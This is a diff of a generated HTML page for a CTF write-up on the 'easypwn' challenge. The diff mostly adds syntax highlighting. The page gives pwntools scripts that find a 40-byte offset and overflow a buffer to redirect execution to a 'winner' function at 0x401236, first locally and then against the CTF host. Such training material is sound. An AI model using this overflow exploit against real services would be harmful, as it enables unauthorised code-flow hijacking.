@@ -29,7 +29,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.119.0">
+<meta name="generator" content="Hugo 0.120.4">
 
     
 
@@ -164,50 +164,50 @@ This command <code>nm -C ./easypwn</code> lets us see the memory address of the 
 <p><img src="/easypwn/Picture5.png" alt="easypwn"></p>
 <p>We see that the <strong>winner function</strong> is the one responsible for printing the flag. Since we already know the address for this function which is <code>0x401236</code>, we only need to know the offset for our payload so we can exploit this program.</p>
 <p>We can use this script to know the offset, which is the number of bytes we need to write to reach to the point where we can overwrite the return address or another critical part of the memory structure, which in this case we want to call the winner function to print the flag.</p>
-<pre tabindex="0"><code>from pwn import *
-
-# Load the ELF
-elf = ELF(&#34;./easypwn&#34;)
-
-# Start the process
-p = process(&#34;./easypwn&#34;)
-
-# Send a cyclic pattern
-p.sendline(cyclic(200, n=8))
-
-# Wait for the process to crash
-p.wait()
-
-# Load the core dump
-core = Coredump(&#39;./core&#39;)  # Adjust the path to your core dump file
-
-# Find and print the offset
-offset = cyclic_find(core.read(core.rsp, 8), n=8)
-print(&#34;Offset:&#34;, offset)
-</code></pre><p>Offset we got is <strong>40</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Load the ELF</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./easypwn&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Start the process</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./easypwn&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send a cyclic pattern</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Wait for the process to crash</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Load the core dump</span>
+</span></span><span class="line"><span class="cl"><span class="n">core</span> <span class="o">=</span> <span class="n">Coredump</span><span class="p">(</span><span class="s1">&#39;./core&#39;</span><span class="p">)</span>  <span class="c1"># Adjust the path to your core dump file</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Find and print the offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">core</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">core</span><span class="o">.</span><span class="n">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Offset:&#34;</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
+</span></span></code></pre></div><p>Offset we got is <strong>40</strong></p>
 <p><img src="/easypwn/Picture7.png" alt="easypwn"></p>
 <p><strong>Let’s start the exploit!</strong></p>
 <p>Since were given a dockerfile, let’s run it first to test if the exploit works.</p>
 <p><code>sudo docker build -t easypwn .</code> &amp; <code>sudo docker run -d -p 1024:1024 --rm -it easypwn</code></p>
 <p><img src="/easypwn/Picture8.png" alt="easypwn"></p>
 <p>We can use this script which also uses pwntools to test our payload locally.</p>
-<pre tabindex="0"><code>from pwn import *
-
-#to test on local net
-p = remote (&#34;127.0.0.1&#34;, 1024) 
-#p = remote (&#34;io.ept.gg&#34;, 30004)
-
-print(p.recvline())
-
-#0x401236 the memory address we want to access (Winner function)
-RIP = p64(0x401236)
-print(RIP)
-
-# 40 is the offset + the payload (RIP)
-p.sendline(b&#34;A&#34;*40+RIP)
-print(p.recvline())
-p.interactive()
-</code></pre><p>The script demonstrates how to connect to a service, send a payload designed to overflow a buffer, and overwrite the program&rsquo;s instruction pointer to redirect the flow of execution to a specific memory address.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#to test on local net</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">#p = remote (&#34;io.ept.gg&#34;, 30004)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#0x401236 the memory address we want to access (Winner function)</span>
+</span></span><span class="line"><span class="cl"><span class="n">RIP</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401236</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">RIP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 40 is the offset + the payload (RIP)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span><span class="o">+</span><span class="n">RIP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>The script demonstrates how to connect to a service, send a payload designed to overflow a buffer, and overwrite the program&rsquo;s instruction pointer to redirect the flow of execution to a specific memory address.</p>
 <p><img src="/easypwn/Picture10.png" alt="easypwn"></p>
 <p>After running the script locally we do get to see the fake flag! Now just to change the IP address in the script to the CTF address which is <code>io.ept.gg:30004</code>, and then we get to see the flag for this challenge. 😊</p>
 <p><img src="/easypwn/Picture11.png" alt="easypwn"></p>
